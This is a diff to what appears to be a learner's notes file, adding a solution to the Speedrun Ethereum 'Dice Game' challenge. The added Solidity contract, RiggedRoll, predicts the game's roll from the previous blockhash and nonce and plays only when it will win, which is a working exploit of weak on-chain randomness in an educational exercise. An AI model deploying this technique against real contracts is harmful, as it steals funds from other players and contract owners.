@@ -211,3 +211,55 @@ function sellTokens(uint256 amount) public {
 
   }
   ```
+
+  ## Challenge 3 - Dice Game
+
+  https://speedrunethereum.com/challenge/dice-game
+
+  The rigged dice game:
+
+  ```
+  pragma solidity >=0.8.0 <0.9.0;  //Do not change the solidity version as it negativly impacts submission grading
+//SPDX-License-Identifier: MIT
+
+import "hardhat/console.sol";
+import "./DiceGame.sol";
+import "@openzeppelin/contracts/access/Ownable.sol";
+
+contract RiggedRoll is Ownable {
+
+    DiceGame public diceGame;
+
+    constructor(address payable diceGameAddress) {
+        diceGame = DiceGame(diceGameAddress);
+    }
+
+    function withdraw(address _addr, uint256 _amount) public payable onlyOwner {
+        require(address(this).balance > 0, "Nothing to withdraw");
+        require(_amount > 0 && _amount <= address(this).balance, "Amount to withdraw must by greater than zero and less than or equal to amount of funds");
+
+        (bool sent,) = _addr.call{value: _amount}("");
+        require(sent, "Error withdrawing funds");
+    }
+
+    function riggedRoll() public payable {
+        require(address(this).balance >= .002 ether, "Rigged roll contract balance must be at least 0.002 eth");
+
+        uint256 nonce = diceGame.nonce();
+        bytes32 prevHash = blockhash(block.number - 1);
+        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), nonce));
+        uint256 roll = uint256(hash) % 16;
+
+        console.log(" rigged role: ", roll);
+        require(roll <= 2, "Losing roll, revert txn");
+
+        // Roll will be a winner
+        console.log("will win - call role the dice");
+        diceGame.rollTheDice{value: 0.002 ether}();
+    }
+
+
+    //Add receive() function so contract can receive Eth
+    receive() external payable {  }
+}
+```
